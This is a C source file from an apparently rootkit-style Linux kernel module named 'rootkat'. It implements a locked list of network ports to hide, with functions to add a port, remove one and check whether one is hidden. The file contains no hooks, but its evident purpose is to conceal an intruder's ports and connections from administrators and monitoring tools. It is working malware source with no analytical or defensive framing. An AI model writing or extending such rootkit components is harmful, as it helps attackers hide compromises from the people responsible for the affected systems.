// SPDX-License-Identifier: MIT
#include <linux/kernel.h>
#include <linux/spinlock.h>
#include "hidden_ports.h"

static u16 hidden_ports[ROOTKAT_HIDDEN_PORTS_MAX];
static int hidden_ports_count;
static DEFINE_SPINLOCK(hidden_ports_lock);

void rootkat_hide_port(u16 port)
{
	int i;
	unsigned long flags;

	spin_lock_irqsave(&hidden_ports_lock, flags);
	for (i = 0; i < hidden_ports_count; i++) {
		if (hidden_ports[i] == port)
			goto out;
	}
	if (hidden_ports_count < ROOTKAT_HIDDEN_PORTS_MAX)
		hidden_ports[hidden_ports_count++] = port;
out:
	spin_unlock_irqrestore(&hidden_ports_lock, flags);
}

void rootkat_unhide_port(u16 port)
{
	int i;
	unsigned long flags;

	spin_lock_irqsave(&hidden_ports_lock, flags);
	for (i = 0; i < hidden_ports_count; i++) {
		if (hidden_ports[i] == port) {
			hidden_ports[i] = hidden_ports[--hidden_ports_count];
			break;
		}
	}
	spin_unlock_irqrestore(&hidden_ports_lock, flags);
}

bool rootkat_is_port_hidden(u16 port)
{
	int i;
	bool hit = false;
	unsigned long flags;

	spin_lock_irqsave(&hidden_ports_lock, flags);
	for (i = 0; i < hidden_ports_count; i++) {
		if (hidden_ports[i] == port) {
			hit = true;
			break;
		}
	}
	spin_unlock_irqrestore(&hidden_ports_lock, flags);
	return hit;
}
